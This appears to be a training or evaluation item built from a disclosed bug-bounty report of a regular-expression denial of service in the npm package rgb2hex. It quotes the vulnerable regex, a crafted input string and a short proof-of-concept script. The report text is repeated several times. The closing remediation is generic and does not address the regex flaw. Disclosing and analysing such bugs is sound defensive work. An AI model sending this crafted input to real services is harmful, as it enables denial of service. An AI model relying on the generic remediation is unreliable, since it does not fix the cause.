# RESOURCE — h1

- source: h1
- class: resource
- cwe: CWE-400
- severity: medium
- program: nodejs-ecosystem
- quality_score: 12

## Scenario

Analyze the following vulnerability report and provide a structured security assessment.

**Report Title:** `rgb2hex` is vulnerable to ReDoS when parsing crafted invalid colors
**Affected Asset:** rgb2hex

**Vulnerability Description:**
I would like to report a ReDoS in `rgb2hex`.
It allows to cause Denial of Service by trying to parse a crafted color string.

# Module

**module name:** rgb2hex
**version:** 0.1.0
**npm page:** `https://www.npmjs.com/package/rgb2hex`

## Module Description

> Parse any rgb or rgba string into a hex color. Lightweight library, no dependencies!

## Module Stats

6 788 downloads in the last day
119 402 downloads in the last week
478 341 downloads in the last month

~5 740 092 estimated downloads per year

# Vulnerability

## Vulnerability Description

ReDoS.

- regex: `/(.*?)rgb(a)*\((\d+),(\d+),(\d+)(,[0-9]*\.*[0-9]+)*\)/`
- evil string: `rgb(0,0,0,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,`
- file: https://github.com/christian-bromann/rgb2hex/blob/master/index.js#L25 (and other places with the same regex)

## Steps To Reproduce:

```js
var rgb2hex = require('rgb2hex');
const color = 'rgb(0,0,0,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,';
console.log(rgb2hex(color));
```

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- Arch Linux Current
- Node.js 9.5.0
- npm 5.6.0

# Wrap up

- I contacted the maintainer to let him know: N
- I opened an issue in the related repository: N

## Impact

Cause denial of service by parsing a crafted color string

**Steps to Reproduce:**
```js
var rgb2hex = require('rgb2hex');
const color = 'rgb(0,0,0,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,';
console.log(rgb2hex(color));
```

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- Arch Linux Current
- Node.js 9.5.0
- npm 5.6.0

# Wrap up

- I contacted the maintainer to let him know: N
- I opened an issue in the related repository: N

**Proof of Concept:**
```js
var rgb2hex = require('rgb2hex');
const color = 'rgb(0,0,0,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,';
console.log(rgb2hex(color));
```

## Analysis / Response

**Vulnerability Class:** resource
**CWE:** CWE-400
**Weakness:** Uncontrolled Resource Consumption
**Severity:** medium
**Endpoint Pattern:** https://www.npmjs.com/package/rgb2hex

**Impact Assessment:**
Cause denial of service by parsing a crafted color string

**Remediation:**
Implement rate limiting and request size limits. Set timeouts on all operations. Use circuit breakers for downstream services. Validate input complexity.
